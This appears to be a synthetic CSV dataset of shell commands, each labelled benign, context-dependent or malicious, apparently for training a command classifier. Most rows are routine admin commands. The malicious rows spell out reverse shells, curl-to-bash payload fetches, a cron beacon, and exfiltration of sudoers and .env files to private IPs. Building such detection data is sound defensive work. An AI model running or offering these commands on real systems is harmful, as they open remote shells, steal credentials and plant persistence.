command,label,original_label,mitre_id
head -50 /var/log/auth.log,Benign,Synthetic,Synthetic
cat /etc/sudoers.d/README,Benign,Synthetic,Synthetic
namei -l /var/www/html/index.html,Benign,Synthetic,Synthetic
kubectl get deployments,Benign,Synthetic,Synthetic
systemctl start docker,Benign,Synthetic,Synthetic
vim /var/www/nginx.conf,Benign,Synthetic,Synthetic
journalctl -f,Benign,Synthetic,Synthetic
grep -ri api_key /home/,Context_Dependent,Synthetic,Synthetic
nslookup internal-dns,Benign,Synthetic,Synthetic
dd if=/dev/mem of=/tmp/mem.dump bs=1M count=100,Context_Dependent,Synthetic,Synthetic
systemctl status fail2ban,Benign,Synthetic,Synthetic
dotnet build,Benign,Synthetic,Synthetic
pip show django,Benign,Synthetic,Synthetic
grep -i 'failed' /var/log/syslog,Benign,Synthetic,Synthetic
git push origin feature-branch,Benign,Synthetic,Synthetic
pip install --upgrade flask,Benign,Synthetic,Synthetic
echo 'kernel.core_pattern=|/tmp/exploit' > /etc/sysctl.d/99-exploit.conf,Malicious,Synthetic,Synthetic
echo '*/5 * * * * curl http://10.0.0.1/beacon | bash' >> /var/spool/cron/root,Malicious,Synthetic,Synthetic
curl -I https://lb-01,Benign,Synthetic,Synthetic
"python3 -c 'import base64; print(base64.b64decode(""dGVzdA==""))'",Context_Dependent,Synthetic,Synthetic
git stash list,Benign,Synthetic,Synthetic
grep -i 'traceback' /var/log/nginx/error.log,Benign,Synthetic,Synthetic
pstree,Benign,Synthetic,Synthetic
ssh -D 3306 user@server,Context_Dependent,Synthetic,Synthetic
vim /usr/local/bin/requirements.txt,Benign,Synthetic,Synthetic
base64 /etc/sudoers | curl -d @- http://172.16.5.10:1234/,Malicious,Synthetic,Synthetic
findmnt,Benign,Synthetic,Synthetic
jq '.' config.json,Benign,Synthetic,Synthetic
ls -la /etc/systemd/system/,Benign,Synthetic,Synthetic
logrotate -d /etc/logrotate.conf,Benign,Synthetic,Synthetic
printf '%s\n' 'test',Benign,Synthetic,Synthetic
grep -i 'WARN' /var/log/syslog,Benign,Synthetic,Synthetic
git stash pop,Benign,Synthetic,Synthetic
cp /opt/app/backup.sh /opt/app/backup.sh.bak,Benign,Synthetic,Synthetic
date +%Y-%m-%d,Benign,Synthetic,Synthetic
atrm 1,Benign,Synthetic,Synthetic
cat /etc/postgresql/14/main/pg_hba.conf,Benign,Synthetic,Synthetic
cal,Benign,Synthetic,Synthetic
host -t AAAA google.com,Benign,Synthetic,Synthetic
chmod g+rw shared/,Benign,Synthetic,Synthetic
ssh ubuntu@production,Benign,Synthetic,Synthetic
curl http://10.10.14.3:9090/rev.py | bash,Malicious,Synthetic,Synthetic
cp /home/admin/Dockerfile /home/admin/Dockerfile.bak,Benign,Synthetic,Synthetic
yarn install,Benign,Synthetic,Synthetic
base64 -d encoded.txt,Benign,Synthetic,Synthetic
docker inspect api,Benign,Synthetic,Synthetic
"socat TCP-LISTEN:4444,fork -",Context_Dependent,Synthetic,Synthetic
md5sum backup.tar.gz,Benign,Synthetic,Synthetic
wget http://172.16.0.50:8080/dropper -O /run/shm/dropper && chmod +x /run/shm/dropper && /run/shm/dropper,Malicious,Synthetic,Synthetic
nc -e /bin/bash 172.16.0.1 9090,Malicious,Synthetic,Synthetic
ssh user@192.168.1.10,Benign,Synthetic,Synthetic
docker start web,Benign,Synthetic,Synthetic
wget http://10.0.0.1/shell.sh -O /tmp/shell.sh,Context_Dependent,Synthetic,Synthetic
nano /opt/services/Makefile,Benign,Synthetic,Synthetic
ls -lah /var/www/html,Benign,Synthetic,Synthetic
ssh ubuntu@staging 'uptime',Benign,Synthetic,Synthetic
ls -lt /opt/services | head -10,Benign,Synthetic,Synthetic
groupadd developers,Benign,Synthetic,Synthetic
cat /etc/security/opasswd,Malicious,Synthetic,Synthetic
mv /home/admin/Dockerfile.old /home/admin/Dockerfile,Benign,Synthetic,Synthetic
systemctl restart kibana,Benign,Synthetic,Synthetic
curl -X POST -d @/etc/sudoers http://10.10.14.3:1337/exfil,Malicious,Synthetic,Synthetic
cp /var/log/package.json /var/log/package.json.bak,Benign,Synthetic,Synthetic
nano /home/user/server.js,Benign,Synthetic,Synthetic
openssl s_client -quiet -connect 10.0.0.1:4444|/bin/bash|openssl s_client -quiet -connect 10.0.0.1:4445,Malicious,Synthetic,Synthetic
gcc -o main main.c,Benign,Synthetic,Synthetic
ip route,Benign,Synthetic,Synthetic
"python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((""10.0.0.1"",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([""/bin/sh"",""-i""])'",Malicious,Synthetic,Synthetic
cat /opt/app/.env | nc 192.168.56.1 6666,Malicious,Synthetic,Synthetic
systemctl restart rsyslog,Benign,Synthetic,Synthetic
mv /etc/nginx/monitor.py.old /etc/nginx/monitor.py,Benign,Synthetic,Synthetic
pip install --upgrade sqlalchemy,Benign,Synthetic,Synthetic
systemctl status docker,Benign,Synthetic,Synthetic
ssh -R 8080:localhost:8080 user@external,Context_Dependent,Synthetic,Synthetic
nbtscan 192.168.1.0/24,Context_Dependent,Synthetic,Synthetic
chmod 600 backup.sh,Benign,Synthetic,Synthetic
uname -r,Benign,Synthetic,Synthetic
